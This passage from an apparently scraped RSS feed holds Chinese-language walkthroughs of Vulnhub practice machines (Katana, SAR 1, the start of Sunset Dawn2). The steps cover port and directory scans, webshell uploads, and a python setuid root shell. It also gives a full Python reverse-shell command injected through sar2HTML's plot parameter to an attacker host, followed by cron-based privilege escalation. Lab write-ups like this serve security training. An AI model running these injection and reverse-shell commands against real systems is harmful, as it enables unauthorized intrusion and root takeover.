&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: &lt;span style="color:#00688b">commonName&lt;/span>=katana/organizationName=webadmin/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: &lt;span style="color:#00688b">commonName&lt;/span>=katana/organizationName=webadmin/countryName=US
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#b452cd">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha256WithRSAEncryption
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2020-05-11T13:57:36
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2022-05-11T13:57:36
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: &lt;span style="color:#b452cd">0443&lt;/span> 4a65 9ba1 0b75 ea8d d1b8 c855 e495
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_SHA-1: f89e f85e e6b3 6b10 4ebc &lt;span style="color:#b452cd">5354&lt;/span> 80a0 0ae3 7e10 50cc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Katana X
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: TLS randomness does not represent &lt;span style="color:#658b00">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| tls-alpn:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| h2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| spdy/2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ http/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-favicon: Unknown favicon MD5: AF89068FFB9883F7D99BB25F75687AC7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8088/tcp open http LiteSpeed httpd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: LiteSpeed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Katana X
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8715/tcp open http nginx 1.14.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.14.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-auth:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| HTTP/1.1 &lt;span style="color:#b452cd">401&lt;/span> Unauthorized&lt;span style="color:#cd5555">\x&lt;/span>0D
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Basic &lt;span style="color:#00688b">realm&lt;/span>=Restricted Content
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: &lt;span style="color:#b452cd">401&lt;/span> Authorization Required
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;h4 id="端口80">端口80&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.21/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:58:10] &lt;span style="color:#b452cd">200&lt;/span> - 655B - /index.html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:58:17] &lt;span style="color:#b452cd">403&lt;/span> - 274B - /server-status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:58:17] &lt;span style="color:#b452cd">403&lt;/span> - 274B - /server-status/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="端口7080">端口7080&lt;/h4>
&lt;p>dirsearch 无收获&lt;/p>
&lt;h4 id="端口8088">端口8088&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.21:8088
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:13] Starting:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:25] &lt;span style="color:#b452cd">301&lt;/span> - 1KB - /cgi-bin -&amp;gt; http://10.0.2.21:8088/cgi-bin/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:27] &lt;span style="color:#b452cd">301&lt;/span> - 1KB - /css -&amp;gt; http://10.0.2.21:8088/css/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:27] &lt;span style="color:#b452cd">301&lt;/span> - 1KB - /docs -&amp;gt; http://10.0.2.21:8088/docs/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:27] &lt;span style="color:#b452cd">200&lt;/span> - 5KB - /docs/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:30] &lt;span style="color:#b452cd">301&lt;/span> - 1KB - /img -&amp;gt; http://10.0.2.21:8088/img/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:30] &lt;span style="color:#b452cd">200&lt;/span> - 655B - /index.html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:36] &lt;span style="color:#b452cd">200&lt;/span> - 50KB - /phpinfo.php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:38] &lt;span style="color:#b452cd">401&lt;/span> - 1KB - /protected/runtime/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:38] &lt;span style="color:#b452cd">401&lt;/span> - 1KB - /protected/data/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:43] &lt;span style="color:#b452cd">200&lt;/span> - 6KB - /upload.html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[01:55:43] &lt;span style="color:#b452cd">200&lt;/span> - 2KB - /upload.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/1.webp" alt="1">&lt;/p>
&lt;p>上传php一句话后，文件名改为&lt;code>katana_2.php&lt;/code>&lt;/p>
&lt;h4 id="端口8715">端口8715&lt;/h4>
&lt;p>访问后有http认证，弱口令admin admin访问后无收获&lt;/p>
&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
&lt;p>根据8088端口上传的文件名称&lt;code>katana_2.php&lt;/code> 编写小脚本&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>import os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">ip&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;10.0.2.21&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">ports&lt;/span> = (&lt;span style="color:#cd5555">&amp;#39;80&amp;#39;&lt;/span>,&lt;span style="color:#cd5555">&amp;#39;7080&amp;#39;&lt;/span>,&lt;span style="color:#cd5555">&amp;#39;8088&amp;#39;&lt;/span>,&lt;span style="color:#cd5555">&amp;#39;8715&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">file&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;katana_2.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> port in ports:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b">url&lt;/span> =&lt;span style="color:#cd5555">&amp;#39;http://&amp;#39;&lt;/span>+ ip +&lt;span style="color:#cd5555">&amp;#39;:&amp;#39;&lt;/span>+port +&lt;span style="color:#cd5555">&amp;#39;/&amp;#39;&lt;/span>+ file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os.system(&lt;span style="color:#cd5555">&amp;#39;curl -I %s &amp;#39;&lt;/span> % url)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/2.webp" alt="2">&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;p>访问http://10.0.2.21:8715/katana_2.php返回200，使用antsword连接成功&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/3.webp" alt="3">&lt;/p>
&lt;p>上传r444.php 访问后本地获得反弹shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/4.webp" alt="4">&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>运行linpeas.sh发现&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/5.webp" alt="5">&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>www-data@katana:/tmp$ python2.7 -c &lt;span style="color:#cd5555">&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># id&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>获得root权限&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/482/6.webp" alt="6">&lt;/p>- https://www.vulnhub.cn/walkthrough/482/ - This is a customized copyright.</description></item><item><title>Vulnhub 425 SAR 1</title><link>https://www.vulnhub.cn/walkthrough/425/</link><pubDate>Sat, 15 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/425/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/425/ -&lt;p>考点：文件上传、命令执行、定时任务&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/sar-1,425/">https://www.vulnhub.com/entry/sar-1,425/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.15&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SAR&lt;/td>
&lt;td>10.0.2.12&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">$tip&lt;/span>=10.0.2.12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$tip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 10.0.2.12 [&lt;span style="color:#b452cd">65535&lt;/span> ports]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 10.0.2.12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET POST OPTIONS HEAD
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 (Ubuntu)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;p>看来要硬钢web应用了&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/1.webp" alt="1">&lt;/p>
&lt;p>查看phpinfo&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/2.webp" alt="2">&lt;/p>
&lt;p>查看robots.txt&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/3.webp" alt="3">&lt;/p>
&lt;p>尝试访问sar2HTML作为二级目录&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/4.webp" alt="4">&lt;/p>
&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
&lt;p>搜一下sar2ascii.tar发现&lt;/p>
&lt;p>&lt;a href="https://www.exploit-db.com/exploits/47204">https://www.exploit-db.com/exploits/47204&lt;/a>&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="靶机测试">靶机测试&lt;/h3>
&lt;h4 id="思路一-命令执行">思路一 命令执行&lt;/h4>
&lt;p>按照https://www.exploit-db.com/exploits/47204 执行命令&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/5.webp" alt="5">&lt;/p>
&lt;p>antsword连接成功&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/6.webp" alt="6">&lt;/p>
&lt;p>使用python直接反弹端口失败了，可以替换&lt;code>python3 python3.5 python3.6 python3.87 python3.8 python3.9&lt;/code>等等，例如这台靶机使用&lt;code>python3&lt;/code>成功反弹&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.12/sar2HTML/index.php?plot=;python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.2.15&amp;#34;,444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="思路二-文件上传">思路二 文件上传&lt;/h4>
&lt;p>另外可以点击new直接上传webshell，对应目录是&lt;code>/sarDATA/uPLOAD/&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.12/sar2HTML/sarDATA/uPLOAD/2.php
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>antsword连接成功&lt;/p>
&lt;h2 id="提权">提权&lt;/h2>
&lt;p>&lt;a href="https://www.iihack.com/pages/tools/linpeas.sh.html">linpeas.sh&lt;/a>跑了遍发现定时任务&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/7.webp" alt="7">&lt;/p>
&lt;h3 id="定时任务">定时任务&lt;/h3>
&lt;p>修改定时任务的文件，每隔五分钟执行&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/8.webp" alt="8">&lt;/p>
&lt;p>静静等待，获得root权限shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/425/9.webp" alt="9">&lt;/p>- https://www.vulnhub.cn/walkthrough/425/ - This is a customized copyright.</description></item><item><title>Vulnhub 424 SUNSET DAWN2</title><link>https://www.vulnhub.cn/walkthrough/424/</link><pubDate>Sat, 15 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/424/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/424/ -&lt;p>考点：windows缓冲区溢出&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/sunset-dawn2,424/">https://www.vulnhub.com/entry/sunset-dawn2,424/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.15&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SUNSET DAWN2&lt;/td>
&lt;td>10.0.2.7&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Windows 调试机（Windows 7 X86）&lt;/td>
&lt;td>10.0.2.14&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
